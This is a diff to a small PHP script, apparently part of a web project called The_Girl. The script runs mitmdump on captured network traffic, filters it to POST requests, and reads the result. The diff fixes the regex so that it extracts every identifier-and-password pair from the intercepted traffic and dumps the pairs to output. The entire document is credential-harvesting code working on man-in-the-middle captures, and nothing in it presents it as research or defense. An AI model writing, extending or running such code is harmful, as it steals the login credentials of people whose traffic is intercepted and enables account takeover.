@@ -3,8 +3,12 @@
 exec("~/mitmdump  -nr /var/www/html/The_Girl/tcore/mitmdump -w /var/www/html/The_Girl/filtered \"~m post\"");
 
 
-$data = file_get_contents("/var/www/html/The_Girl/filtered");
+$str = file_get_contents("/var/www/html/The_Girl/filtered");
 
-preg_match('/indentifier=(.*)&password=(.*)/', 'foobarbaz', $matches, PREG_OFFSET_CAPTURE);
-print_r($matches);
+$re = '/identifier=(.*)&password=(.*)/';
+
+preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);
+
+// Print the entire match result
+var_dump($matches);
 ?>
